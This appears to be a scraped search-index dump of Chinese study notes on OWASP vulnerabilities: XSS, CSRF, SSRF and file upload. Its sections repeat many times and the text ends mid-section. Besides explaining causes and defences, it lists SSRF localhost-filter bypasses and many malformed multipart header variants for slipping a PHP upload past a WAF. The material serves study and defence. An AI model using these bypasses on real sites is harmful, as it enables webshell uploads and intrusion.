Scripting，为了和CSS分开简写为XSS，中文名为跨站脚本。该漏洞发生在用户端，是指在渲染过程中发生了非预期的JavaScript代码执行。XSS通常被用于获取Cookie、以受攻击者的身份进行操作等行为。 2.分类：反射型XSS 储存型XSS DOM XSS 3.危害​ 1.用户的Cookie被获取，其中可能存在Session ID等敏感信息。若服务器端没有做相应防护，攻击者可用对应Cookie登陆服务器。 ​ 2.攻击者能够在一定限度内记录用户的键盘输入。 ​ 3.攻击者通过CSRF等方式以用户身份执行危险操作。 ​ 4.XSS蠕虫。 ​ 5.获取用户浏览器信息。 ​ 6.利用XSS漏洞扫描用户内网。 4.防御：**总体思路:**对用户输入进行过滤,对输出进行编码 1.对用户输入进行XSS防御方式有2种:基于黑名单的过滤和基于白名单的过滤. 而白名单相对来说更安全; 黑名单:只规定哪些数据不能被输入,很可能被绕过;比如对 ' \" \u003c\u003e 等进行过滤 白名单:只定义哪些数据正常才能被提交; 2.设置http-only参数为true,这样JS就不能读取cookie信息了;(特殊常见可能被绕过) 3.使用一些函数进行防御 4.不要随意打开一些来历不明的网站或链接 5.如何快速判定XSS类型？存储型XSS： 发送一次带XSS代码的请求，以后这个页面的返回包里都会有XSS代码； 反射型XSS： 发送一次带XSS代码的请求，只能在当前返回的数据包中发现XSS代码； DOM型XSS： 发送一次带XSS代码的请求，在返回包里没有XSS代码； 6.存储型XSS怎么利用XSS攻击的原理是通过修改或者添加页面上的JavaScript恶意脚本，在浏览器渲染页面的时 候执行该脚本，从而实现窃取COOKIE或者调用Ajax实现其他类型的CSRF攻击，还可以插入 beef进行钓鱼等 7.CORS（浏览器同源策略）js =\u003eajax 去请求其他网站的东西 test.com 根据浏览器的CORS策略 他只能在test.com里面请求东西 test.com 调用ajax 去访问 xxxx.com assdasd.test.com 如果目标的CORS头 默 认不放行test.com 这样 test.com 的ajax请求就不会访问其他网站 8.XSS绕过waf总结 Script 标签 JavaScript 事件 行内样式(Inlinestyle) CSS import Javascript URL 利用字符编码 绕过长度限制 超文本内容 变形主要包含大小写和JavaScript变形 ","date":"2023-11-17","objectID":"/hvv_owasptop10/:1:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#6存储型xss怎么利用"},{"categories":["hvv"],"content":"\r02-xss漏洞\r1.原理XSS全称为Cross Site Scripting，为了和CSS分开简写为XSS，中文名为跨站脚本。该漏洞发生在用户端，是指在渲染过程中发生了非预期的JavaScript代码执行。XSS通常被用于获取Cookie、以受攻击者的身份进行操作等行为。 2.分类：反射型XSS 储存型XSS DOM XSS 3.危害​ 1.用户的Cookie被获取，其中可能存在Session ID等敏感信息。若服务器端没有做相应防护，攻击者可用对应Cookie登陆服务器。 ​ 2.攻击者能够在一定限度内记录用户的键盘输入。 ​ 3.攻击者通过CSRF等方式以用户身份执行危险操作。 ​ 4.XSS蠕虫。 ​ 5.获取用户浏览器信息。 ​ 6.利用XSS漏洞扫描用户内网。 4.防御：**总体思路:**对用户输入进行过滤,对输出进行编码 1.对用户输入进行XSS防御方式有2种:基于黑名单的过滤和基于白名单的过滤. 而白名单相对来说更安全; 黑名单:只规定哪些数据不能被输入,很可能被绕过;比如对 ' \" \u003c\u003e 等进行过滤 白名单:只定义哪些数据正常才能被提交; 2.设置http-only参数为true,这样JS就不能读取cookie信息了;(特殊常见可能被绕过) 3.使用一些函数进行防御 4.不要随意打开一些来历不明的网站或链接 5.如何快速判定XSS类型？存储型XSS： 发送一次带XSS代码的请求，以后这个页面的返回包里都会有XSS代码； 反射型XSS： 发送一次带XSS代码的请求，只能在当前返回的数据包中发现XSS代码； DOM型XSS： 发送一次带XSS代码的请求，在返回包里没有XSS代码； 6.存储型XSS怎么利用XSS攻击的原理是通过修改或者添加页面上的JavaScript恶意脚本，在浏览器渲染页面的时 候执行该脚本，从而实现窃取COOKIE或者调用Ajax实现其他类型的CSRF攻击，还可以插入 beef进行钓鱼等 7.CORS（浏览器同源策略）js =\u003eajax 去请求其他网站的东西 test.com 根据浏览器的CORS策略 他只能在test.com里面请求东西 test.com 调用ajax 去访问 xxxx.com assdasd.test.com 如果目标的CORS头 默 认不放行test.com 这样 test.com 的ajax请求就不会访问其他网站 8.XSS绕过waf总结 Script 标签 JavaScript 事件 行内样式(Inlinestyle) CSS import Javascript URL 利用字符编码 绕过长度限制 超文本内容 变形主要包含大小写和JavaScript变形 ","date":"2023-11-17","objectID":"/hvv_owasptop10/:1:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#7cors浏览器同源策略"},{"categories":["hvv"],"content":"\r02-xss漏洞\r1.原理XSS全称为Cross Site Scripting，为了和CSS分开简写为XSS，中文名为跨站脚本。该漏洞发生在用户端，是指在渲染过程中发生了非预期的JavaScript代码执行。XSS通常被用于获取Cookie、以受攻击者的身份进行操作等行为。 2.分类：反射型XSS 储存型XSS DOM XSS 3.危害​ 1.用户的Cookie被获取，其中可能存在Session ID等敏感信息。若服务器端没有做相应防护，攻击者可用对应Cookie登陆服务器。 ​ 2.攻击者能够在一定限度内记录用户的键盘输入。 ​ 3.攻击者通过CSRF等方式以用户身份执行危险操作。 ​ 4.XSS蠕虫。 ​ 5.获取用户浏览器信息。 ​ 6.利用XSS漏洞扫描用户内网。 4.防御：**总体思路:**对用户输入进行过滤,对输出进行编码 1.对用户输入进行XSS防御方式有2种:基于黑名单的过滤和基于白名单的过滤. 而白名单相对来说更安全; 黑名单:只规定哪些数据不能被输入,很可能被绕过;比如对 ' \" \u003c\u003e 等进行过滤 白名单:只定义哪些数据正常才能被提交; 2.设置http-only参数为true,这样JS就不能读取cookie信息了;(特殊常见可能被绕过) 3.使用一些函数进行防御 4.不要随意打开一些来历不明的网站或链接 5.如何快速判定XSS类型？存储型XSS： 发送一次带XSS代码的请求，以后这个页面的返回包里都会有XSS代码； 反射型XSS： 发送一次带XSS代码的请求，只能在当前返回的数据包中发现XSS代码； DOM型XSS： 发送一次带XSS代码的请求，在返回包里没有XSS代码； 6.存储型XSS怎么利用XSS攻击的原理是通过修改或者添加页面上的JavaScript恶意脚本，在浏览器渲染页面的时 候执行该脚本，从而实现窃取COOKIE或者调用Ajax实现其他类型的CSRF攻击，还可以插入 beef进行钓鱼等 7.CORS（浏览器同源策略）js =\u003eajax 去请求其他网站的东西 test.com 根据浏览器的CORS策略 他只能在test.com里面请求东西 test.com 调用ajax 去访问 xxxx.com assdasd.test.com 如果目标的CORS头 默 认不放行test.com 这样 test.com 的ajax请求就不会访问其他网站 8.XSS绕过waf总结 Script 标签 JavaScript 事件 行内样式(Inlinestyle) CSS import Javascript URL 利用字符编码 绕过长度限制 超文本内容 变形主要包含大小写和JavaScript变形 ","date":"2023-11-17","objectID":"/hvv_owasptop10/:1:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#8xss绕过waf总结"},{"categories":["hvv"],"content":"\r03-csrf漏洞\r1.原理：​ 当黑客发现某网站存在CSRF漏洞，并且构造攻击参数将payload制作成网页，用户访问存在CSRF漏洞的网站，并且登录到后台，获取cookie，此时黑客发送带有payload的网址给用户，用户同时打开黑客所发来的网址，执行了payload，则造成了一次CSRF攻击 2.形成原因：​ 主要是漏洞网站没有经过二次验证，和用户在浏览漏洞网站的时候，同时点击了hack制造的payload 3.如何防止 CSRF?1.验证 referer 2.验证 token 4.csrf成功利用的条件1- 用户在统一浏览器下 2- 没有关闭浏览器的情况下 3- 访问了攻击者精心伪装好的恶意链接 5.XSS和CSRF的区别 xss是单一网站不需要登录就能获取cookie,csrf是有一个漏洞网站,和一个攻击网站需要先登录漏洞网站 xss是向网站注入js代码,执行js代码.csrf利用网站本身漏洞去执行网站功能 CSRF比XSS漏洞危害更高。 CSRF可以做到的事情，XSS都可以做到。 XSS有局限性，而CSRF没有局限性。 XSS针对客户端，而CSRF针对服务端。 XSS是利用合法用户获取其信息，而CSRF是伪造成合法用户发起请求。 ","date":"2023-11-17","objectID":"/hvv_owasptop10/:2:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#03-csrf漏洞"},{"categories":["hvv"],"content":"\r03-csrf漏洞\r1.原理：​ 当黑客发现某网站存在CSRF漏洞，并且构造攻击参数将payload制作成网页，用户访问存在CSRF漏洞的网站，并且登录到后台，获取cookie，此时黑客发送带有payload的网址给用户，用户同时打开黑客所发来的网址，执行了payload，则造成了一次CSRF攻击 2.形成原因：​ 主要是漏洞网站没有经过二次验证，和用户在浏览漏洞网站的时候，同时点击了hack制造的payload 3.如何防止 CSRF?1.验证 referer 2.验证 token 4.csrf成功利用的条件1- 用户在统一浏览器下 2- 没有关闭浏览器的情况下 3- 访问了攻击者精心伪装好的恶意链接 5.XSS和CSRF的区别 xss是单一网站不需要登录就能获取cookie,csrf是有一个漏洞网站,和一个攻击网站需要先登录漏洞网站 xss是向网站注入js代码,执行js代码.csrf利用网站本身漏洞去执行网站功能 CSRF比XSS漏洞危害更高。 CSRF可以做到的事情，XSS都可以做到。 XSS有局限性，而CSRF没有局限性。 XSS针对客户端，而CSRF针对服务端。 XSS是利用合法用户获取其信息，而CSRF是伪造成合法用户发起请求。 ","date":"2023-11-17","objectID":"/hvv_owasptop10/:2:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#1原理-2"},{"categories":["hvv"],"content":"\r03-csrf漏洞\r1.原理：​ 当黑客发现某网站存在CSRF漏洞，并且构造攻击参数将payload制作成网页，用户访问存在CSRF漏洞的网站，并且登录到后台，获取cookie，此时黑客发送带有payload的网址给用户，用户同时打开黑客所发来的网址，执行了payload，则造成了一次CSRF攻击 2.形成原因：​ 主要是漏洞网站没有经过二次验证，和用户在浏览漏洞网站的时候，同时点击了hack制造的payload 3.如何防止 CSRF?1.验证 referer 2.验证 token 4.csrf成功利用的条件1- 用户在统一浏览器下 2- 没有关闭浏览器的情况下 3- 访问了攻击者精心伪装好的恶意链接 5.XSS和CSRF的区别 xss是单一网站不需要登录就能获取cookie,csrf是有一个漏洞网站,和一个攻击网站需要先登录漏洞网站 xss是向网站注入js代码,执行js代码.csrf利用网站本身漏洞去执行网站功能 CSRF比XSS漏洞危害更高。 CSRF可以做到的事情，XSS都可以做到。 XSS有局限性，而CSRF没有局限性。 XSS针对客户端，而CSRF针对服务端。 XSS是利用合法用户获取其信息，而CSRF是伪造成合法用户发起请求。 ","date":"2023-11-17","objectID":"/hvv_owasptop10/:2:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#2形成原因"},{"categories":["hvv"],"content":"\r03-csrf漏洞\r1.原理：​ 当黑客发现某网站存在CSRF漏洞，并且构造攻击参数将payload制作成网页，用户访问存在CSRF漏洞的网站，并且登录到后台，获取cookie，此时黑客发送带有payload的网址给用户，用户同时打开黑客所发来的网址，执行了payload，则造成了一次CSRF攻击 2.形成原因：​ 主要是漏洞网站没有经过二次验证，和用户在浏览漏洞网站的时候，同时点击了hack制造的payload 3.如何防止 CSRF?1.验证 referer 2.验证 token 4.csrf成功利用的条件1- 用户在统一浏览器下 2- 没有关闭浏览器的情况下 3- 访问了攻击者精心伪装好的恶意链接 5.XSS和CSRF的区别 xss是单一网站不需要登录就能获取cookie,csrf是有一个漏洞网站,和一个攻击网站需要先登录漏洞网站 xss是向网站注入js代码,执行js代码.csrf利用网站本身漏洞去执行网站功能 CSRF比XSS漏洞危害更高。 CSRF可以做到的事情，XSS都可以做到。 XSS有局限性，而CSRF没有局限性。 XSS针对客户端，而CSRF针对服务端。 XSS是利用合法用户获取其信息，而CSRF是伪造成合法用户发起请求。 ","date":"2023-11-17","objectID":"/hvv_owasptop10/:2:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#3如何防止-csrf"},{"categories":["hvv"],"content":"\r03-csrf漏洞\r1.原理：​ 当黑客发现某网站存在CSRF漏洞，并且构造攻击参数将payload制作成网页，用户访问存在CSRF漏洞的网站，并且登录到后台，获取cookie，此时黑客发送带有payload的网址给用户，用户同时打开黑客所发来的网址，执行了payload，则造成了一次CSRF攻击 2.形成原因：​ 主要是漏洞网站没有经过二次验证，和用户在浏览漏洞网站的时候，同时点击了hack制造的payload 3.如何防止 CSRF?1.验证 referer 2.验证 token 4.csrf成功利用的条件1- 用户在统一浏览器下 2- 没有关闭浏览器的情况下 3- 访问了攻击者精心伪装好的恶意链接 5.XSS和CSRF的区别 xss是单一网站不需要登录就能获取cookie,csrf是有一个漏洞网站,和一个攻击网站需要先登录漏洞网站 xss是向网站注入js代码,执行js代码.csrf利用网站本身漏洞去执行网站功能 CSRF比XSS漏洞危害更高。 CSRF可以做到的事情，XSS都可以做到。 XSS有局限性，而CSRF没有局限性。 XSS针对客户端，而CSRF针对服务端。 XSS是利用合法用户获取其信息，而CSRF是伪造成合法用户发起请求。 ","date":"2023-11-17","objectID":"/hvv_owasptop10/:2:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#4csrf成功利用的条件"},{"categories":["hvv"],"content":"\r03-csrf漏洞\r1.原理：​ 当黑客发现某网站存在CSRF漏洞，并且构造攻击参数将payload制作成网页，用户访问存在CSRF漏洞的网站，并且登录到后台，获取cookie，此时黑客发送带有payload的网址给用户，用户同时打开黑客所发来的网址，执行了payload，则造成了一次CSRF攻击 2.形成原因：​ 主要是漏洞网站没有经过二次验证，和用户在浏览漏洞网站的时候，同时点击了hack制造的payload 3.如何防止 CSRF?1.验证 referer 2.验证 token 4.csrf成功利用的条件1- 用户在统一浏览器下 2- 没有关闭浏览器的情况下 3- 访问了攻击者精心伪装好的恶意链接 5.XSS和CSRF的区别 xss是单一网站不需要登录就能获取cookie,csrf是有一个漏洞网站,和一个攻击网站需要先登录漏洞网站 xss是向网站注入js代码,执行js代码.csrf利用网站本身漏洞去执行网站功能 CSRF比XSS漏洞危害更高。 CSRF可以做到的事情，XSS都可以做到。 XSS有局限性，而CSRF没有局限性。 XSS针对客户端，而CSRF针对服务端。 XSS是利用合法用户获取其信息，而CSRF是伪造成合法用户发起请求。 ","date":"2023-11-17","objectID":"/hvv_owasptop10/:2:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#5xss和csrf的区别"},{"categories":["hvv"],"content":"\r04-ssrf漏洞\r1.原理SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统 1）服务器允许向其他服务器获取资源 2）但是并没有对该地址做严格的过滤和限制 3）所以导致了攻击者可以向受害者服务器，传入任意的URL 地址，并将数据返回 2.防御：1.限制请求的端口为 HTTP 常用的端口，比如 80,443,8080,8088 等 2.黑名单内网 IP。 3.禁用不需要的协议，仅仅允许 HTTP 和 HTTPS 3.SSRF 禁用 127.0.0.1 后如何绕过，支持哪些协议？(1)利用进制转换 (2)利用DNS解析 (3)利用句号（127。0。0。1） (4)利用[::]（http://[::]:80/） (5)利用@（http://example.com@127.0.0.1） (6)利用短地址（http://dwz.cn/11SMa） (7)协议（Dict://、SFTP://、TFTP://、LDAP://、Gopher://） 4.漏洞存在的地方：1.能够对外发起网络请求的地方 2.请求远程服务器资源的地方 3.数据库内置功能 4.邮件系统 5.文件处理 6.在线处理工具 https://xz.aliyun.com/t/11215 https://zhuanlan.zhihu.com/p/346220565 https://www.buaq.net/go-66428.html ","date":"2023-11-17","objectID":"/hvv_owasptop10/:3:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#04-ssrf漏洞"},{"categories":["hvv"],"content":"\r04-ssrf漏洞\r1.原理SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统 1）服务器允许向其他服务器获取资源 2）但是并没有对该地址做严格的过滤和限制 3）所以导致了攻击者可以向受害者服务器，传入任意的URL 地址，并将数据返回 2.防御：1.限制请求的端口为 HTTP 常用的端口，比如 80,443,8080,8088 等 2.黑名单内网 IP。 3.禁用不需要的协议，仅仅允许 HTTP 和 HTTPS 3.SSRF 禁用 127.0.0.1 后如何绕过，支持哪些协议？(1)利用进制转换 (2)利用DNS解析 (3)利用句号（127。0。0。1） (4)利用[::]（http://[::]:80/） (5)利用@（http://example.com@127.0.0.1） (6)利用短地址（http://dwz.cn/11SMa） (7)协议（Dict://、SFTP://、TFTP://、LDAP://、Gopher://） 4.漏洞存在的地方：1.能够对外发起网络请求的地方 2.请求远程服务器资源的地方 3.数据库内置功能 4.邮件系统 5.文件处理 6.在线处理工具 https://xz.aliyun.com/t/11215 https://zhuanlan.zhihu.com/p/346220565 https://www.buaq.net/go-66428.html ","date":"2023-11-17","objectID":"/hvv_owasptop10/:3:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#1原理-3"},{"categories":["hvv"],"content":"\r04-ssrf漏洞\r1.原理SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统 1）服务器允许向其他服务器获取资源 2）但是并没有对该地址做严格的过滤和限制 3）所以导致了攻击者可以向受害者服务器，传入任意的URL 地址，并将数据返回 2.防御：1.限制请求的端口为 HTTP 常用的端口，比如 80,443,8080,8088 等 2.黑名单内网 IP。 3.禁用不需要的协议，仅仅允许 HTTP 和 HTTPS 3.SSRF 禁用 127.0.0.1 后如何绕过，支持哪些协议？(1)利用进制转换 (2)利用DNS解析 (3)利用句号（127。0。0。1） (4)利用[::]（http://[::]:80/） (5)利用@（http://example.com@127.0.0.1） (6)利用短地址（http://dwz.cn/11SMa） (7)协议（Dict://、SFTP://、TFTP://、LDAP://、Gopher://） 4.漏洞存在的地方：1.能够对外发起网络请求的地方 2.请求远程服务器资源的地方 3.数据库内置功能 4.邮件系统 5.文件处理 6.在线处理工具 https://xz.aliyun.com/t/11215 https://zhuanlan.zhihu.com/p/346220565 https://www.buaq.net/go-66428.html ","date":"2023-11-17","objectID":"/hvv_owasptop10/:3:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#2防御"},{"categories":["hvv"],"content":"\r04-ssrf漏洞\r1.原理SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统 1）服务器允许向其他服务器获取资源 2）但是并没有对该地址做严格的过滤和限制 3）所以导致了攻击者可以向受害者服务器，传入任意的URL 地址，并将数据返回 2.防御：1.限制请求的端口为 HTTP 常用的端口，比如 80,443,8080,8088 等 2.黑名单内网 IP。 3.禁用不需要的协议，仅仅允许 HTTP 和 HTTPS 3.SSRF 禁用 127.0.0.1 后如何绕过，支持哪些协议？(1)利用进制转换 (2)利用DNS解析 (3)利用句号（127。0。0。1） (4)利用[::]（http://[::]:80/） (5)利用@（http://example.com@127.0.0.1） (6)利用短地址（http://dwz.cn/11SMa） (7)协议（Dict://、SFTP://、TFTP://、LDAP://、Gopher://） 4.漏洞存在的地方：1.能够对外发起网络请求的地方 2.请求远程服务器资源的地方 3.数据库内置功能 4.邮件系统 5.文件处理 6.在线处理工具 https://xz.aliyun.com/t/11215 https://zhuanlan.zhihu.com/p/346220565 https://www.buaq.net/go-66428.html ","date":"2023-11-17","objectID":"/hvv_owasptop10/:3:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#3ssrf-禁用-127001-后如何绕过支持哪些协议"},{"categories":["hvv"],"content":"\r04-ssrf漏洞\r1.原理SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统 1）服务器允许向其他服务器获取资源 2）但是并没有对该地址做严格的过滤和限制 3）所以导致了攻击者可以向受害者服务器，传入任意的URL 地址，并将数据返回 2.防御：1.限制请求的端口为 HTTP 常用的端口，比如 80,443,8080,8088 等 2.黑名单内网 IP。 3.禁用不需要的协议，仅仅允许 HTTP 和 HTTPS 3.SSRF 禁用 127.0.0.1 后如何绕过，支持哪些协议？(1)利用进制转换 (2)利用DNS解析 (3)利用句号（127。0。0。1） (4)利用[::]（http://[::]:80/） (5)利用@（http://example.com@127.0.0.1） (6)利用短地址（http://dwz.cn/11SMa） (7)协议（Dict://、SFTP://、TFTP://、LDAP://、Gopher://） 4.漏洞存在的地方：1.能够对外发起网络请求的地方 2.请求远程服务器资源的地方 3.数据库内置功能 4.邮件系统 5.文件处理 6.在线处理工具 https://xz.aliyun.com/t/11215 https://zhuanlan.zhihu.com/p/346220565 https://www.buaq.net/go-66428.html ","date":"2023-11-17","objectID":"/hvv_owasptop10/:3:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#4漏洞存在的地方"},{"categories":["hvv"],"content":"\r05-文件上传漏洞：\r1.文件上传原理 用户在 Web 页面上选择要上传的文件，并提交表单。 浏览器将表单中的数据进行编码并作为 POST 请求发送给 Web 服务器。 Web 服务器接收到请求后，会解析请求参数，获取上传的文件数据。 服务器对上传的文件进行校验和过滤，例如检查文件格式、大小、类型等，防止上传恶意文件。 如果上传的文件符合要求，则将文件存储在指定的位置，如果不符合要求，则拒绝上传并返回错误信息。 服务器返回上传结果给客户端，告知用户文件是否上传成功。 2.漏洞原理：由于程序员在对用户文件上传功能实现代码没有严格限制用户上传文件后缀以及文件类型或者处理缺陷，而导致用户可以越过本身权限向服务器上传木马去控制服务器. 3.攻击特征文件类型绕过、文件名欺骗、恶意文件内容、大小限制绕过、插入../等字符遍历目录 4.需满足条件首先上传文件能够被web容器解释执行,所以文件上传后所在的目录要是web容器所覆盖到的路径,其次,用户能够从web访问这个文件,如果文件上传了,但是用户无法通过web 访问,或者无法得到web容器解释这个脚本,那么也不能称为漏洞,最后,文件上传的文件若被安全检查,格式化,图片压缩等功能改变了内容,则也可能攻击不成功 5.数据包中可修改的地方 Content-Disposition 一般可以更改 name 表单参数值. 不能更改filename :文件名 可以更改Content-Type:文件MIME 视情况更改boundary:内容划分,可以更改 6.waf如何拦截恶意文件 文件名:解析文件名,判断是否在黑名单内 文件内容:解析文件内容,判断是否为webshell 文件目录权限:这个由主机waf实现 获取Request Header中Content-Type的boundary值 根据boundary值,解析post数据,获取文件名 判断文件名是否在拦截黑名单/白名单之外 7.绕过\r黑名单绕过a.通过一些特殊后缀 .php5 、.phtml、.asa、.jap等 b.上传.htacess c.pHp大小写变换 d.在数据包中 后文件缀名前加空格 e.后缀名前加. f.加上::$DATA g.未循环验证，可以使用x.php…类似的方法 白名单绕过（一般需要配合其他漏洞一起利用） a.%00截断 在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束。 %00适用于php\u003e5.3.42,且服务器中的php.ini中的magic_quotes_gpc = Off，才可以进行%00截断 （magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有:post、get、cookie过来的数据增加转义字符“\\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误） 字符变异\r引号变换头部字段的值既可以添加单引号也可以添加双引号,还可以不添加引号,都不会影响上传的结果,还可以去除filename字符串中的引号. Content-Disposition: \"form-data\"; name=file_x; filename=\"xx.php\" Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php Content-Disposition: form-data; name=\"file_x\"; filename='xx.php Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php; 大小写变换对关键字符进行大小写转换 Content-Disposition name filename.比如将name转换成NaMe,Content-Disposition转换成content-disposition 添加换行符字符值与等号之间可以加入换行符,依然可以正常上传,如使用 Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\" Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\"[0x09] Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]xx.php[0x09]; 多个分号文件解析时,可能因为分号解析不到文件名,导致绕过 Content-Disposition: form-data; name=\"file_x\";;; filename=\"test.php\" 多个等号在post中的内容中使用多个等号对文件上传没有影响 Content-Disposition: form-data; name==\"file_x\"; filename====\"test.php\" 变换Content-Disposition的值在某些waf解析的时候,认为Content-Dispostion的值一定是form-data,造成绕过,其实Content-Dispostion可以任意变换或为空 Content-Disposition: fOrM-DaTA; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-da+ta; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: fo r m-dat a; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-dataxx; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: name=\"file_x\"; filename=\"xx.php\" 畸形的boundary头部boundary可以变换为如下形式,且不影响上传 multipart/form-data大小写变换 Content-Type: mUltiPart/ForM-dATa; boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用空格分割,且中间可以插入任何值 Content-Type: multipart/form-data boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data x boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data abcdefg boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data a\\|/?!@#$%^() boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用逗号分割,且中间可以插入任何值 Content-Type: multipart/form-data,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,x,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,abcdefg,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,a\\|/?!@#$%^(),boundary=----WebKitFormBoundarye111 boundary之前可以直接加入任何值(php可行) Content-Type: multipart/form-data;bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 boundary末尾可以使用逗号或者分号隔开插入任何值 Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111;123abc Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111,123abc 顺序颠倒交换name和filename的顺序 因为规定了Content-Disposition必须在最前面,所以只能交换","date":"2023-11-17","objectID":"/hvv_owasptop10/:4:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#05-文件上传漏洞"},{"categories":["hvv"],"content":"\r05-文件上传漏洞：\r1.文件上传原理 用户在 Web 页面上选择要上传的文件，并提交表单。 浏览器将表单中的数据进行编码并作为 POST 请求发送给 Web 服务器。 Web 服务器接收到请求后，会解析请求参数，获取上传的文件数据。 服务器对上传的文件进行校验和过滤，例如检查文件格式、大小、类型等，防止上传恶意文件。 如果上传的文件符合要求，则将文件存储在指定的位置，如果不符合要求，则拒绝上传并返回错误信息。 服务器返回上传结果给客户端，告知用户文件是否上传成功。 2.漏洞原理：由于程序员在对用户文件上传功能实现代码没有严格限制用户上传文件后缀以及文件类型或者处理缺陷，而导致用户可以越过本身权限向服务器上传木马去控制服务器. 3.攻击特征文件类型绕过、文件名欺骗、恶意文件内容、大小限制绕过、插入../等字符遍历目录 4.需满足条件首先上传文件能够被web容器解释执行,所以文件上传后所在的目录要是web容器所覆盖到的路径,其次,用户能够从web访问这个文件,如果文件上传了,但是用户无法通过web 访问,或者无法得到web容器解释这个脚本,那么也不能称为漏洞,最后,文件上传的文件若被安全检查,格式化,图片压缩等功能改变了内容,则也可能攻击不成功 5.数据包中可修改的地方 Content-Disposition 一般可以更改 name 表单参数值. 不能更改filename :文件名 可以更改Content-Type:文件MIME 视情况更改boundary:内容划分,可以更改 6.waf如何拦截恶意文件 文件名:解析文件名,判断是否在黑名单内 文件内容:解析文件内容,判断是否为webshell 文件目录权限:这个由主机waf实现 获取Request Header中Content-Type的boundary值 根据boundary值,解析post数据,获取文件名 判断文件名是否在拦截黑名单/白名单之外 7.绕过\r黑名单绕过a.通过一些特殊后缀 .php5 、.phtml、.asa、.jap等 b.上传.htacess c.pHp大小写变换 d.在数据包中 后文件缀名前加空格 e.后缀名前加. f.加上::$DATA g.未循环验证，可以使用x.php…类似的方法 白名单绕过（一般需要配合其他漏洞一起利用） a.%00截断 在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束。 %00适用于php\u003e5.3.42,且服务器中的php.ini中的magic_quotes_gpc = Off，才可以进行%00截断 （magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有:post、get、cookie过来的数据增加转义字符“\\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误） 字符变异\r引号变换头部字段的值既可以添加单引号也可以添加双引号,还可以不添加引号,都不会影响上传的结果,还可以去除filename字符串中的引号. Content-Disposition: \"form-data\"; name=file_x; filename=\"xx.php\" Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php Content-Disposition: form-data; name=\"file_x\"; filename='xx.php Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php; 大小写变换对关键字符进行大小写转换 Content-Disposition name filename.比如将name转换成NaMe,Content-Disposition转换成content-disposition 添加换行符字符值与等号之间可以加入换行符,依然可以正常上传,如使用 Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\" Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php Content-Disposition: \"form-data\"; name=\"file_x\"; 